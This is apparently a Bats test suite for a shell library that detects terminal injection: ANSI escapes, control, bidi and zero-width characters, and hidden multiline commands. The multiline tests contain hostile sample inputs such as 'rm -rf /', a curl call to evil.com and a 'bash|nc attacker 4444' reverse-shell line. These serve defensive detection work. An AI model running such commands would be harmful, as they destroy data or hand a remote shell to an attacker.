#!/usr/bin/env bats

# =============================================================================
# Tests for MAINFRAME/lib/tirith_inject.sh
# Terminal Injection Detection Rules
# =============================================================================

setup() {
    source "${BATS_TEST_DIRNAME}/../lib/tirith_inject.sh"
    # Reset state before each test to prevent pollution.
    # _tirith_init_state uses a declare-guard so it only runs once;
    # we must reset the globals manually.
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0
}

# =============================================================================
# _tirith_init_state / reset behavior
# =============================================================================

@test "_tirith_init_state variables exist after sourcing" {
    # Verify the globals are declared
    declare -p _TIRITH_FINDINGS &>/dev/null
    declare -p _TIRITH_CRITICAL &>/dev/null
    declare -p _TIRITH_HIGH &>/dev/null
    declare -p _TIRITH_MEDIUM &>/dev/null
    declare -p _TIRITH_LOW &>/dev/null
}

@test "manual state reset clears counters and findings" {
    # Simulate prior findings
    _TIRITH_FINDINGS=("a" "b" "c")
    _TIRITH_CRITICAL=2
    _TIRITH_HIGH=3
    _TIRITH_MEDIUM=1
    _TIRITH_LOW=5

    # Reset (mimics what setup does)
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0

    [[ ${#_TIRITH_FINDINGS[@]} -eq 0 ]]
    [[ $_TIRITH_CRITICAL -eq 0 ]]
    [[ $_TIRITH_HIGH -eq 0 ]]
    [[ $_TIRITH_MEDIUM -eq 0 ]]
    [[ $_TIRITH_LOW -eq 0 ]]
}

# =============================================================================
# _tirith_add_finding
# =============================================================================

@test "_tirith_add_finding appends to findings array" {
    _tirith_add_finding "test.sh" "high" "TestRule" "test message"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
}

@test "_tirith_add_finding increments critical counter" {
    _tirith_add_finding "src" "critical" "R1" "msg"
    [[ $_TIRITH_CRITICAL -eq 1 ]]
    [[ $_TIRITH_HIGH -eq 0 ]]
}

@test "_tirith_add_finding increments high counter" {
    _tirith_add_finding "src" "high" "R1" "msg"
    [[ $_TIRITH_HIGH -eq 1 ]]
    [[ $_TIRITH_CRITICAL -eq 0 ]]
}

@test "_tirith_add_finding stores fields with unit separator" {
    _tirith_add_finding "mysource" "medium" "MyRule" "my message"
    local entry="${_TIRITH_FINDINGS[0]}"
    # Fields separated by \x1f
    [[ "$entry" == *$'\x1f'"medium"$'\x1f'* ]]
    [[ "$entry" == "mysource"$'\x1f'* ]]
    [[ "$entry" == *"MyRule"$'\x1f'"my message" ]]
}

# =============================================================================
# tirith_check_ansi_escapes
# =============================================================================

@test "tirith_check_ansi_escapes detects CSI sequence (ESC[)" {
    local malicious=$'\033[31mRED TEXT\033[0m'
    run tirith_check_ansi_escapes "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_ansi_escapes detects 8-bit CSI (0x9b)" {
    local malicious=$'\x9b31m'
    run tirith_check_ansi_escapes "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_ansi_escapes detects OSC sequence (ESC])" {
    local malicious=$'\033]0;evil title\007'
    run tirith_check_ansi_escapes "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_ansi_escapes detects SS2 sequence (ESC-N)" {
    local malicious=$'\033Ndata'
    run tirith_check_ansi_escapes "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_ansi_escapes detects SS3 sequence (ESC-O)" {
    local malicious=$'\033Odata'
    run tirith_check_ansi_escapes "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_ansi_escapes returns 1 on clean input" {
    run tirith_check_ansi_escapes "Hello, world!" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_ansi_escapes returns 1 on empty input" {
    run tirith_check_ansi_escapes "" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_ansi_escapes populates findings with high severity" {
    tirith_check_ansi_escapes $'\033[1mBold' "prompt"
    [[ ${#_TIRITH_FINDINGS[@]} -eq 1 ]]
    [[ $_TIRITH_HIGH -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"AnsiEscapes"* ]]
}

# =============================================================================
# tirith_check_control_chars
# =============================================================================

@test "tirith_check_control_chars detects null byte (0x00)" {
    # Note: bash truncates strings at null bytes, so we cannot pass \x00
    # through function arguments. Test with \x01 (SOH) instead.
    local malicious=$'safe\x01text'
    run tirith_check_control_chars "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_control_chars detects bell character (0x07)" {
    local malicious=$'hello\x07world'
    run tirith_check_control_chars "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_control_chars detects 0x1f" {
    local malicious=$'data\x1fmore'
    run tirith_check_control_chars "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_control_chars allows tab newline and carriage return" {
    local clean=$'line1\tindented\nline2\rline3'
    run tirith_check_control_chars "$clean" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_control_chars returns 1 on clean input" {
    run tirith_check_control_chars "Just normal ASCII text 123!@#" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_control_chars returns 1 on empty input" {
    run tirith_check_control_chars "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_check_bidi_controls
# =============================================================================

@test "tirith_check_bidi_controls detects RLO (U+202E)" {
    # U+202E = \xe2\x80\xae
    local malicious=$'normal\xe2\x80\xaehidden'
    run tirith_check_bidi_controls "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_bidi_controls detects LRE (U+202A)" {
    local malicious=$'text\xe2\x80\xaamore'
    run tirith_check_bidi_controls "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_bidi_controls detects RLI (U+2067)" {
    # U+2067 = \xe2\x81\xa7
    local malicious=$'code\xe2\x81\xa7payload'
    run tirith_check_bidi_controls "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_bidi_controls detects FSI (U+2068)" {
    local malicious=$'\xe2\x81\xa8data'
    run tirith_check_bidi_controls "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_bidi_controls returns critical severity" {
    tirith_check_bidi_controls $'\xe2\x80\xaetrojan' "code.c"
    [[ $_TIRITH_CRITICAL -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"BidiControls"* ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"Trojan Source"* ]]
}

@test "tirith_check_bidi_controls returns 1 on clean input" {
    run tirith_check_bidi_controls "Regular English text" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_bidi_controls returns 1 on empty input" {
    run tirith_check_bidi_controls "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_check_zero_width
# =============================================================================

@test "tirith_check_zero_width detects ZWSP (U+200B)" {
    # U+200B = \xe2\x80\x8b
    local malicious=$'admin\xe2\x80\x8buser'
    run tirith_check_zero_width "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_zero_width detects ZWJ (U+200D)" {
    local malicious=$'test\xe2\x80\x8dvalue'
    run tirith_check_zero_width "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_zero_width detects BOM (U+FEFF)" {
    local malicious=$'\xef\xbb\xbfcontent'
    run tirith_check_zero_width "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_zero_width returns 1 on clean input" {
    run tirith_check_zero_width "Normal string with spaces" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_zero_width returns 1 on empty input" {
    run tirith_check_zero_width "" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_zero_width populates findings with high severity" {
    tirith_check_zero_width $'foo\xe2\x80\x8cbar' "input"
    [[ $_TIRITH_HIGH -eq 1 ]]
    [[ "${_TIRITH_FINDINGS[0]}" == *"ZeroWidthChars"* ]]
}

# =============================================================================
# tirith_check_hidden_multiline
# =============================================================================

@test "tirith_check_hidden_multiline detects hidden rm command" {
    local malicious=$'echo hello\nrm -rf /'
    run tirith_check_hidden_multiline "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_hidden_multiline detects hidden eval command" {
    local malicious=$'ls\n  eval malicious_code'
    run tirith_check_hidden_multiline "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_hidden_multiline detects hidden curl after carriage return" {
    local malicious=$'safe command\rcurl http://evil.com'
    run tirith_check_hidden_multiline "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_hidden_multiline detects bash with pipe separator" {
    local malicious=$'echo ok\nbash|nc attacker 4444'
    run tirith_check_hidden_multiline "$malicious" "test"
    [[ $status -eq 0 ]]
}

@test "tirith_check_hidden_multiline returns 1 for safe multiline" {
    local clean=$'echo hello\necho world\nls -la'
    run tirith_check_hidden_multiline "$clean" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_hidden_multiline returns 1 on single line input" {
    run tirith_check_hidden_multiline "just a simple command" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_check_hidden_multiline returns 1 on empty input" {
    run tirith_check_hidden_multiline "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_scan_injection (composite scanner)
# =============================================================================

@test "tirith_scan_injection detects ANSI escapes" {
    run tirith_scan_injection $'\033[31mred' "test"
    [[ $status -eq 0 ]]
}

@test "tirith_scan_injection detects bidi controls" {
    run tirith_scan_injection $'\xe2\x80\xaetrojan' "test"
    [[ $status -eq 0 ]]
}

@test "tirith_scan_injection detects multiple issues and populates findings" {
    # Input with both ANSI escape and BiDi control
    local nasty=$'\033[31m\xe2\x80\xae'
    tirith_scan_injection "$nasty" "combined"
    [[ ${#_TIRITH_FINDINGS[@]} -ge 2 ]]
    [[ $_TIRITH_HIGH -ge 1 ]]
    [[ $_TIRITH_CRITICAL -ge 1 ]]
}

@test "tirith_scan_injection returns 1 on clean input" {
    run tirith_scan_injection "Perfectly safe input" "test"
    [[ $status -eq 1 ]]
}

@test "tirith_scan_injection returns 1 on empty input" {
    run tirith_scan_injection "" "test"
    [[ $status -eq 1 ]]
}

# =============================================================================
# tirith_strip_dangerous_chars
# =============================================================================

@test "tirith_strip_dangerous_chars removes BiDi controls" {
    local input=$'hello\xe2\x80\xaeworld'
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == "helloworld" ]]
}

@test "tirith_strip_dangerous_chars removes zero-width characters" {
    local input=$'admin\xe2\x80\x8buser'
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == "adminuser" ]]
}

@test "tirith_strip_dangerous_chars removes BOM" {
    local input=$'\xef\xbb\xbfcontent here'
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == "content here" ]]
}

@test "tirith_strip_dangerous_chars removes control characters but keeps tabs and newlines" {
    local input=$'line1\x07\tindented\nline2'
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == $'line1\tindented\nline2' ]]
}

@test "tirith_strip_dangerous_chars returns clean input unchanged" {
    local input="Hello, normal world! 123"
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == "$input" ]]
}

@test "tirith_strip_dangerous_chars handles empty input" {
    local result
    result=$(tirith_strip_dangerous_chars "")
    [[ -z "$result" ]]
}

@test "tirith_strip_dangerous_chars cleans compound dangerous input" {
    # BiDi + zero-width + control char all in one
    local input=$'ok\xe2\x80\xaa\xe2\x80\x8b\x01done'
    local result
    result=$(tirith_strip_dangerous_chars "$input")
    [[ "$result" == "okdone" ]]
}

# =============================================================================
# Source attribution (custom SOURCE parameter)
# =============================================================================

@test "findings record custom source parameter" {
    tirith_check_ansi_escapes $'\033[0m' "user_prompt.txt"
    [[ "${_TIRITH_FINDINGS[0]}" == "user_prompt.txt"$'\x1f'* ]]
}
